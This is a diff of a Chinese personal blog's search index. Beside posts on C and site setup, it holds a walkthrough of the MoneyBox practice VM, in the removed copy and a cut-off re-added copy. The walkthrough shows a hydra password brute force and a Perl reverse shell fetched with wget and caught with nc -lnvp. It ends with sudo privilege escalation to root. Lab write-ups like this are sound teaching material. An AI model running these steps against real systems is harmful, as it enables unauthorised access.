@@ -1,105 +1,23 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>要置顶的公告</title>
-    <url>/2023/08/05/%E8%A6%81%E7%BD%AE%E9%A1%B6%E7%9A%84%E5%85%AC%E5%91%8A/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h1 id="新朋友初次见面-老朋友好久不见-这里是猫涅"><a href="#新朋友初次见面-老朋友好久不见-这里是猫涅" class="headerlink" title="新朋友初次见面 老朋友好久不见 这里是猫涅"></a>新朋友初次见面 老朋友好久不见 这里是猫涅</h1><p>2023/9/5 更新：<br>超绝帅气的介绍页进入页面已经<s>借助chatgpt的伟力</s>完成了<br>后期完善会在那里加点分支<br>还有就是随笔啥的多半会加到里面 博客主题仅分享学术内容好了<br>2023/10/22 更新:<br>c语言这块还差一点收尾的环节<br>介绍一下新环节 靶机分析<br>课上讲过的再通过图文还原一下<br>2023/10/26 更新:<br>icon全面更换为了自制手绘icon 耶<br><img data-src="/2023/08/05/%E8%A6%81%E7%BD%AE%E9%A1%B6%E7%9A%84%E5%85%AC%E5%91%8A/medium.png" alt="icon"></p>
-<p><a href="https://markdown.com.cn/cheat-sheet.html">关于markdown的写作相关</a> </p>
-<p>ps:<br>hexo装到奇怪的地方了 所以git bash的时候命令前记得加npx<br>还有就是git bash中的复制粘贴分别是<br><strong>复制: ctrl + insert</strong><br><strong>粘贴: shift + insert</strong></p>
-<p>无渲染跳转方式: 在文章前加入</p>
-<pre class="line-numbers language-none"><code class="language-none">---
-layout: false 
---- <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></body></html>]]></content>
-      <tags>
-        <tag>告示</tag>
-      </tags>
+    <title>创建个人主页！</title>
+    <url>/2023/06/28/hello-world/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>没啥事干所以就创建了<br>这里多半会写课上的笔记<br>在hexo中遇到的技术难关<br>请多指教</p>
+</body></html>]]></content>
   </entry>
   <entry>
-    <title>moneybox解析</title>
-    <url>/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p><em><strong>注1:由于我没有解决加载问题 因此没有魔法网络的用户很有可能无法顺利看到图片 烦请根据文字自己判断一下步骤结果 谢谢</strong></em><br><em><strong>注2:该教程使用的环境是我的个人pc 实战操作可能由于系统原因 vmware配置 虚拟机版本等出现细微的不同 希望各位随机应变勇闯难关</strong></em></p>
-<h1 id="1-关于事先配置"><a href="#1-关于事先配置" class="headerlink" title="1.关于事先配置"></a>1.关于事先配置</h1><p>安装了<strong>vmware</strong>的pc一台<br>kali <a href="https://www.kali.org/get-kali/#kali-virtual-machines">下载页面</a><br>还有我们的主角 moneybox <a href="https://www.vulnhub.com/entry/moneybox-1,653/#download">下载页面</a><br>在<strong>vmware</strong>中打开虚拟机 选择kali和moneybox并安装</p>
-<p>为了方便后续的步骤<strong>记得在虚拟机设置-网络适配器中将两个虚拟机都设置为NAT模式</strong><br>这样你就完成了基础的配置</p>
-<h1 id="2-具体步骤"><a href="#2-具体步骤" class="headerlink" title="2.具体步骤"></a>2.具体步骤</h1><span id="more"></span>
-<h2 id="（1）moneybox的启动"><a href="#（1）moneybox的启动" class="headerlink" title="（1）moneybox的启动"></a>（1）moneybox的启动</h2><p>在启动时立马按e编辑启动项</p>
-<p><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step1.jpg" alt="step1.jpg"></p>
-<p>↑在启动项中 linux 开头这行将 <strong>ro</strong> 改成 <strong>rw single init=bin/bash</strong><br>随后按 <strong>ctrl+x</strong> 保存<br>可以通过进入单用户模式的方式修改密码<br>输入<strong>passwd root</strong> 将密码更改成任意你所希望的样子<br>这之后重启 输入账号<strong>root</strong> 与 <strong>你更改的密码</strong><br>进入后输入 <strong>dhclient</strong> 配置网络接口<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step2.jpg" alt="step2.jpg"><br>↑示例<br>随后一直挂着moneybox就可以了 转到kali这边</p>
-<h2 id="（2）kali部分的操作"><a href="#（2）kali部分的操作" class="headerlink" title="（2）kali部分的操作"></a>（2）kali部分的操作</h2><h3 id="（2-1）找到靶机所处的网段"><a href="#（2-1）找到靶机所处的网段" class="headerlink" title="（2.1）找到靶机所处的网段"></a>（2.1）找到靶机所处的网段</h3><p>kali打开 默认账号密码是kali/kali<br>先 <strong>sudo arp-scan -l</strong> 扫描一下同网段设备<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step3.jpg" alt="step3.jpg"><br>不太确定哪个是靶机 是吧<br>先用<strong>nmap -p- 192.168.246.0/24</strong>扫描一下这些ip开放的端口<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step4.jpg" alt="step4.jpg"><br>结果说<strong>192.168.246.129</strong>开放了仨端口 分别是<strong>21 22 80</strong><br>可以确定是靶机了<br>接下来就会围绕这个ip展开操作</p>
-<h3 id="（2-2）三个端口所引导的线索"><a href="#（2-2）三个端口所引导的线索" class="headerlink" title="（2.2）三个端口所引导的线索"></a>（2.2）三个端口所引导的线索</h3><p>首先是 <strong>21端口</strong> 对应的 <strong>ftp功能</strong><br>使用ftp+ip的方式尝试远程登陆<br>发现需要密码 回车后显示<strong>530 This FTP server is anonymous only.</strong><br>既然仅限匿名登录 那就<strong>以anonymous为账号 密码为空</strong>来登陆<br>登录完毕 ls查看目录下文件<br>有一张名为trytofind.jpg的图片 用get+文件名的方式获取<br>随后用exit退出ftp<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step5.jpg" alt="step5.jpg"><br><strong>steghide+info+图片文件名</strong>寻找是否有图片隐写 发现需要密码 线索暂时断了<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step7.jpg" alt="step7.jpg"></p>
-<p> <em><strong>ps:关于显示steghide未安装 随后无法安装显示E:Unable to locate package的解决方式</strong></em></p>
-<blockquote>
-<p>第一步：打开sources.list文件</p>
-</blockquote>
-<pre class="line-numbers language-none"><code class="language-none">sudo vim /etc/apt/sources.list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<blockquote>
-<p>第二步：在文件中添加以下内容</p>
-</blockquote>
-<pre class="line-numbers language-none"><code class="language-none">deb http://http.kali.org/kali kali-rolling main contrib non-free
-deb http://http.kali.org/kali sana main non-free contrib
-deb http://security.kali.org/kali-security sana/updates main contrib non-free
-deb http://old.kali.org/kali moto main non-free contrib<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<blockquote>
-<p>然后保存退出，再进行更新</p>
-</blockquote>
-<pre class="line-numbers language-none"><code class="language-none">sudo apt-get update<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<blockquote>
-<p>————————————————<br>版权声明：上面这段说明为CSDN博主「聂大哥」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/weixin_43729943/article/details/104221462">https://blog.csdn.net/weixin_43729943/article/details/104221462</a></p>
-</blockquote>
-<p><strong>22端口所对应的ssh功能</strong>通常需要账号密码 目前没有线索 我们先转到http上去寻找<br>打开firefox 我们输入ip地址<strong>192.168.246.129</strong><br>进入主页<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step8.jpg" alt="step8.jpg"><br>我们<strong>f12</strong>查看一下源码<br>发现啥也没藏<br>于是使用我们的工具<br><strong>dirb+网址</strong>来寻找是否有潜在的目录<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step9.jpg" alt="step9.jpg"><br>↑运行结果发现了名为<a href="http://192.168.246.129/blogs/index.html%E7%9A%84%E7%9B%AE%E5%BD%95">http://192.168.246.129/blogs/index.html的目录</a><br>进入网址<br>还是老样子<strong>f12</strong>查看源码 发现注释里藏了点东西<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step10.jpg" alt="step10.jpg"><br>它说是提示在这个目录里 那就进入<a href="http://192.168.246.129/S3cr3t-T3xt/">http://192.168.246.129/S3cr3t-T3xt/</a><br>还是在源码里藏了东西<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step11.jpg" alt="step11.jpg"><br>发现了一段Secret Key 保存下来备用<br>我们猜测这段密文和steghide中的密码相对应 尝试输入<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step12.jpg" alt="step12.jpg"><br>提取出了<strong>data.txt</strong><br>其中内容为暗示一个<strong>名为renu的用户</strong>的密码强度很弱<br>或许可以使用密码爆破来获得密码<br>于是我们可以利用<strong>kali自带的密码爆破字典</strong>与<strong>hydra</strong>来爆破<br>rockyou.txt被压缩，需要解压才能够使用</p>
-<pre class="line-numbers language-none"><code class="language-none">gzip -d /usr/share/wordlists/rockyou.txt.gz		#-d 将压缩文件解压
-ll /usr/share/wordlists/rockyou.txt		#显示当前目录下文件详细信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><em><strong>hydra使用方法:</strong></em></p>
-<pre class="line-numbers language-none"><code class="language-none">hydra -l 用户名 -P 密码字典 协议://ip地址<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step13.jpg" alt="step13.jpg"><br>↑试出来的结果是密码为987654321</p>
-<h3 id="2-3-ssh连接与操作"><a href="#2-3-ssh连接与操作" class="headerlink" title="(2.3)ssh连接与操作"></a>(2.3)ssh连接与操作</h3><p>使用<strong>ssh+账号@ip:端口</strong>来链接renu<br>输入密码 链接成功<br>输入ls来查看文件 有一个txt<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step14.jpg" alt="step14.jpg"><br>↑cat user1.txt获得第一个flag<br>第二个flag在于这个电脑所留下的操作历史<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step15.jpg" alt="step15.jpg"><br>里面有免密登陆一个叫lily的用户的过程<br>说明此用户已经将自己的公钥拷贝到了靶机系统上的lily用户家目录的authorized_keys文件，从而可以不用密码就以lily身份登录到靶机上。<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step16.jpg" alt="step16.jpg"><br>第二个flag也获得了<br>第三个flag多半是在root账号中<br>但sudo的权限也无法查看<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step17.jpg" alt="step17.jpg"><br>这里就要用到一些高级操作<br>我这里直接引用课上的讲义了</p>
-<blockquote>
-<p>执行sudo -l发现该用户存在sudo赋权，程序为/usr/bin/perl，perl同python类似，也是一门解释型语言，推测靶机应该有perl运行环境。下面是如何通过Perl程序提权的实现过程。<br>思路：kali中自带perl脚本反弹shell，将其略加修改拷贝到靶机上；该脚本需要在渗透机监听一个端口(默认为1234)，然后在靶机上运行perl脚本，靶机会自动反弹一个shell到渗透机，从而通过运行perl程序获得一个管理员的Shell。</p>
-</blockquote>
-<ol>
-<li>定位kali中的perl脚本反弹shell，将其拷贝到kali的/var/www/html下，重命名为p.php；<pre class="line-numbers language-none"><code class="language-none">cd /usr/share/webshells/perl
-sudo cp perl-reverse-shell.pl /var/www/html/p.php
-cd /var/www/html
-ls<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step18.jpg" alt="step18.jpg"></li>
-<li>修改p.php文件内容，将反弹连接的Ip地址改为kali的IP；<pre class="line-numbers language-none"><code class="language-none">sudo vim p.php //把my $ip这段单引号里面的ip改成kali的<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step19.jpg" alt="step19.jpg"></li>
-<li>开启kali的网站服务<pre class="line-numbers language-none"><code class="language-none">systemctl start apache2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step20.jpg" alt="step20.jpg"></li>
-<li>切换到靶机lily会话，通过http协议下载p.php<pre class="line-numbers language-none"><code class="language-none">wget http://ip/p.php //不知道ip的可以在另个窗口ifconfig查看<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step21.jpg" alt="step21.jpg"></li>
-<li>kali 通过nc命令监听1234端口<pre class="line-numbers language-none"><code class="language-none">nc -lnvp 1234<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step22.jpg" alt="step22.jpg"></li>
-<li>靶机上通过sudo 运行p.php程序<pre class="line-numbers language-none"><code class="language-none">sudo /usr/bin/perl p.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step23.jpg" alt="step23.jpg"></li>
-<li>切换到渗透机kali，成功反弹管理员权限shell<pre class="line-numbers language-none"><code class="language-none">id
-cd /root
-ls -a
-cat .root.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step24.jpg" alt="step24.jpg"></li>
-<li>拿到最终flag啦！<pre class="line-numbers language-none"><code class="language-none">Congratulations.......!
-
-You Successfully completed MoneyBox
-
-Finally The Root Flag
-    ==&gt; r00t{H4ckth3p14n3t}
-
-I'm Kirthik-KarvendhanT
-    It's My First CTF Box
-         
-instagram : ____kirthik____
-
-See You Back....<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-</ol>
-<h1 id="3-总结"><a href="#3-总结" class="headerlink" title="3.总结"></a>3.总结</h1><p>前两个flag较为简易 最后一个flag要花点力气<br>希望今后的学习能让我更透彻的理解渗透测试的奥妙<br>那么 下次再见！</p>
-</body></html>]]></content>
+    <title>liunx中ssh服务相关知识</title>
+    <url>/2023/11/08/linux%E4%B8%ADssh%E6%9C%8D%E5%8A%A1%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h1 id="最近课程讲到了ssh服务-故此做个记录"><a href="#最近课程讲到了ssh服务-故此做个记录" class="headerlink" title="最近课程讲到了ssh服务 故此做个记录"></a>最近课程讲到了ssh服务 故此做个记录</h1></body></html>]]></content>
       <tags>
         <tag>学习</tag>
-        <tag>靶机解析</tag>
+        <tag>linux</tag>
       </tags>
   </entry>
   <entry>
-    <title>C语言 启动！</title>
-    <url>/2023/08/01/C%E8%AF%AD%E8%A8%80%20%E5%90%AF%E5%8A%A8%EF%BC%81/</url>
+    <title>C语言相关1</title>
+    <url>/2023/08/01/C%E8%AF%AD%E8%A8%80%E7%9B%B8%E5%85%B31/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>所以 最近很闲 所以开始学c语言</p>
 <span id="more"></span>
 <h1 id="准备步骤"><a href="#准备步骤" class="headerlink" title="准备步骤"></a>准备步骤</h1><p>我使用了visual studio code配置c语言环境的方法来实现程序的调试和运行<br><a href="https://www.bilibili.com/video/BV19c411G7ey">我所参考的教程</a></p>
@@ -378,7 +296,7 @@ int main()
 1*9=9   2*9=18  3*9=27  4*9=36  5*9=45  6*9=54  7*9=63  8*9=72  9*9=81<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></body></html>]]></content>
       <tags>
         <tag>学习</tag>
-        <tag>c</tag>
+        <tag>c语言</tag>
       </tags>
   </entry>
   <entry>
@@ -387,15 +305,6 @@ int main()
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>因为找到工作了所以更新会稍微有点摸<br>总之先来试一下网易云的html是否可以加入音乐播放</p>
 <p>就很怪<br>网易云-生成外链播放器 再加上hexo中的md语法支持html自然可以成功<br>可是根据网上教程在主页左下角生成一个播放器的方式无法正常运行<br>下次再说吧</p>
 </body></html>]]></content>
-  </entry>
-  <entry>
-    <title>再来一次</title>
-    <url>/2023/07/01/%E6%8E%A8%E5%80%92%E9%87%8D%E6%9D%A5/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>简单来说<br>由于next旧版本与网上大部分教程无法对应<br>于是我决心直接更新推倒重来<br>网页恢复了最初始的样子<br>好消息是背景保留了</p>
-</body></html>]]></content>
-      <tags>
-        <tag>告示</tag>
-      </tags>
   </entry>
   <entry>
     <title>关于在next7.8.0中建设评论功能这件事</title>
@@ -442,9 +351,92 @@ int main()
       </tags>
   </entry>
   <entry>
-    <title>目前的进展</title>
-    <url>/2023/06/29/%E7%9B%AE%E5%89%8D%E7%9A%84%E8%BF%9B%E5%B1%95/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>参考<code><a href="https://asdfv1929.github.io/2018/01/25/crash-cheat/">https://asdfv1929.github.io/2018/01/25/crash-cheat/</a></code>完成了标题特效<br>目前想做的玩意：<br>背景音乐播放<br>live2d看板娘<br>背景加上图片 亦或者动效<br>把介绍页摸完<br>完善尾注<br>剩下就是这网站因为铺设在外网<br>加载速度<b>超级慢</b></p>
+    <title>moneybox解析</title>
+    <url>/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p><em><strong>注1:由于我没有解决加载问题 因此没有魔法网络的用户很有可能无法顺利看到图片 烦请根据文字自己判断一下步骤结果 谢谢</strong></em><br><em><strong>注2:该教程使用的环境是我的个人pc 实战操作可能由于系统原因 vmware配置 虚拟机版本等出现细微的不同 希望各位随机应变勇闯难关</strong></em></p>
+<h1 id="1-关于事先配置"><a href="#1-关于事先配置" class="headerlink" title="1.关于事先配置"></a>1.关于事先配置</h1><p>安装了<strong>vmware</strong>的pc一台<br>kali <a href="https://www.kali.org/get-kali/#kali-virtual-machines">下载页面</a><br>还有我们的主角 moneybox <a href="https://www.vulnhub.com/entry/moneybox-1,653/#download">下载页面</a><br>在<strong>vmware</strong>中打开虚拟机 选择kali和moneybox并安装</p>
+<p>为了方便后续的步骤<strong>记得在虚拟机设置-网络适配器中将两个虚拟机都设置为NAT模式</strong><br>这样你就完成了基础的配置</p>
+<h1 id="2-具体步骤"><a href="#2-具体步骤" class="headerlink" title="2.具体步骤"></a>2.具体步骤</h1><span id="more"></span>
+<h2 id="（1）moneybox的启动"><a href="#（1）moneybox的启动" class="headerlink" title="（1）moneybox的启动"></a>（1）moneybox的启动</h2><p>在启动时立马按e编辑启动项</p>
+<p><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step1.jpg" alt="step1.jpg"></p>
+<p>↑在启动项中 linux 开头这行将 <strong>ro</strong> 改成 <strong>rw single init=bin/bash</strong><br>随后按 <strong>ctrl+x</strong> 保存<br>可以通过进入单用户模式的方式修改密码<br>输入<strong>passwd root</strong> 将密码更改成任意你所希望的样子<br>这之后重启 输入账号<strong>root</strong> 与 <strong>你更改的密码</strong><br>进入后输入 <strong>dhclient</strong> 配置网络接口<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step2.jpg" alt="step2.jpg"><br>↑示例<br>随后一直挂着moneybox就可以了 转到kali这边</p>
+<h2 id="（2）kali部分的操作"><a href="#（2）kali部分的操作" class="headerlink" title="（2）kali部分的操作"></a>（2）kali部分的操作</h2><h3 id="（2-1）找到靶机所处的网段"><a href="#（2-1）找到靶机所处的网段" class="headerlink" title="（2.1）找到靶机所处的网段"></a>（2.1）找到靶机所处的网段</h3><p>kali打开 默认账号密码是kali/kali<br>先 <strong>sudo arp-scan -l</strong> 扫描一下同网段设备<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step3.jpg" alt="step3.jpg"><br>不太确定哪个是靶机 是吧<br>先用<strong>nmap -p- 192.168.246.0/24</strong>扫描一下这些ip开放的端口<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step4.jpg" alt="step4.jpg"><br>结果说<strong>192.168.246.129</strong>开放了仨端口 分别是<strong>21 22 80</strong><br>可以确定是靶机了<br>接下来就会围绕这个ip展开操作</p>
+<h3 id="（2-2）三个端口所引导的线索"><a href="#（2-2）三个端口所引导的线索" class="headerlink" title="（2.2）三个端口所引导的线索"></a>（2.2）三个端口所引导的线索</h3><p>首先是 <strong>21端口</strong> 对应的 <strong>ftp功能</strong><br>使用ftp+ip的方式尝试远程登陆<br>发现需要密码 回车后显示<strong>530 This FTP server is anonymous only.</strong><br>既然仅限匿名登录 那就<strong>以anonymous为账号 密码为空</strong>来登陆<br>登录完毕 ls查看目录下文件<br>有一张名为trytofind.jpg的图片 用get+文件名的方式获取<br>随后用exit退出ftp<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step5.jpg" alt="step5.jpg"><br><strong>steghide+info+图片文件名</strong>寻找是否有图片隐写 发现需要密码 线索暂时断了<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step7.jpg" alt="step7.jpg"></p>
+<p> <em><strong>ps:关于显示steghide未安装 随后无法安装显示E:Unable to locate package的解决方式</strong></em></p>
+<blockquote>
+<p>第一步：打开sources.list文件</p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">sudo vim /etc/apt/sources.list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<blockquote>
+<p>第二步：在文件中添加以下内容</p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">deb http://http.kali.org/kali kali-rolling main contrib non-free
+deb http://http.kali.org/kali sana main non-free contrib
+deb http://security.kali.org/kali-security sana/updates main contrib non-free
+deb http://old.kali.org/kali moto main non-free contrib<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<blockquote>
+<p>然后保存退出，再进行更新</p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">sudo apt-get update<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<blockquote>
+<p>————————————————<br>版权声明：上面这段说明为CSDN博主「聂大哥」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/weixin_43729943/article/details/104221462">https://blog.csdn.net/weixin_43729943/article/details/104221462</a></p>
+</blockquote>
+<p><strong>22端口所对应的ssh功能</strong>通常需要账号密码 目前没有线索 我们先转到http上去寻找<br>打开firefox 我们输入ip地址<strong>192.168.246.129</strong><br>进入主页<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step8.jpg" alt="step8.jpg"><br>我们<strong>f12</strong>查看一下源码<br>发现啥也没藏<br>于是使用我们的工具<br><strong>dirb+网址</strong>来寻找是否有潜在的目录<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step9.jpg" alt="step9.jpg"><br>↑运行结果发现了名为<a href="http://192.168.246.129/blogs/index.html%E7%9A%84%E7%9B%AE%E5%BD%95">http://192.168.246.129/blogs/index.html的目录</a><br>进入网址<br>还是老样子<strong>f12</strong>查看源码 发现注释里藏了点东西<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step10.jpg" alt="step10.jpg"><br>它说是提示在这个目录里 那就进入<a href="http://192.168.246.129/S3cr3t-T3xt/">http://192.168.246.129/S3cr3t-T3xt/</a><br>还是在源码里藏了东西<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step11.jpg" alt="step11.jpg"><br>发现了一段Secret Key 保存下来备用<br>我们猜测这段密文和steghide中的密码相对应 尝试输入<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step12.jpg" alt="step12.jpg"><br>提取出了<strong>data.txt</strong><br>其中内容为暗示一个<strong>名为renu的用户</strong>的密码强度很弱<br>或许可以使用密码爆破来获得密码<br>于是我们可以利用<strong>kali自带的密码爆破字典</strong>与<strong>hydra</strong>来爆破<br>rockyou.txt被压缩，需要解压才能够使用</p>
+<pre class="line-numbers language-none"><code class="language-none">gzip -d /usr/share/wordlists/rockyou.txt.gz		#-d 将压缩文件解压
+ll /usr/share/wordlists/rockyou.txt		#显示当前目录下文件详细信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><em><strong>hydra使用方法:</strong></em></p>
+<pre class="line-numbers language-none"><code class="language-none">hydra -l 用户名 -P 密码字典 协议://ip地址<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step13.jpg" alt="step13.jpg"><br>↑试出来的结果是密码为987654321</p>
+<h3 id="2-3-ssh连接与操作"><a href="#2-3-ssh连接与操作" class="headerlink" title="(2.3)ssh连接与操作"></a>(2.3)ssh连接与操作</h3><p>使用<strong>ssh+账号@ip:端口</strong>来链接renu<br>输入密码 链接成功<br>输入ls来查看文件 有一个txt<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step14.jpg" alt="step14.jpg"><br>↑cat user1.txt获得第一个flag<br>第二个flag在于这个电脑所留下的操作历史<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step15.jpg" alt="step15.jpg"><br>里面有免密登陆一个叫lily的用户的过程<br>说明此用户已经将自己的公钥拷贝到了靶机系统上的lily用户家目录的authorized_keys文件，从而可以不用密码就以lily身份登录到靶机上。<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step16.jpg" alt="step16.jpg"><br>第二个flag也获得了<br>第三个flag多半是在root账号中<br>但sudo的权限也无法查看<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step17.jpg" alt="step17.jpg"><br>这里就要用到一些高级操作<br>我这里直接引用课上的讲义了</p>
+<blockquote>
+<p>执行sudo -l发现该用户存在sudo赋权，程序为/usr/bin/perl，perl同python类似，也是一门解释型语言，推测靶机应该有perl运行环境。下面是如何通过Perl程序提权的实现过程。<br>思路：kali中自带perl脚本反弹shell，将其略加修改拷贝到靶机上；该脚本需要在渗透机监听一个端口(默认为1234)，然后在靶机上运行perl脚本，靶机会自动反弹一个shell到渗透机，从而通过运行perl程序获得一个管理员的Shell。</p>
+</blockquote>
+<ol>
+<li>定位kali中的perl脚本反弹shell，将其拷贝到kali的/var/www/html下，重命名为p.php；<pre class="line-numbers language-none"><code class="language-none">cd /usr/share/webshells/perl
+sudo cp perl-reverse-shell.pl /var/www/html/p.php
+cd /var/www/html
+ls<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step18.jpg" alt="step18.jpg"></li>
+<li>修改p.php文件内容，将反弹连接的Ip地址改为kali的IP；<pre class="line-numbers language-none"><code class="language-none">sudo vim p.php //把my $ip这段单引号里面的ip改成kali的<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step19.jpg" alt="step19.jpg"></li>
+<li>开启kali的网站服务<pre class="line-numbers language-none"><code class="language-none">systemctl start apache2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step20.jpg" alt="step20.jpg"></li>
+<li>切换到靶机lily会话，通过http协议下载p.php<pre class="line-numbers language-none"><code class="language-none">wget http://ip/p.php //不知道ip的可以在另个窗口ifconfig查看<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
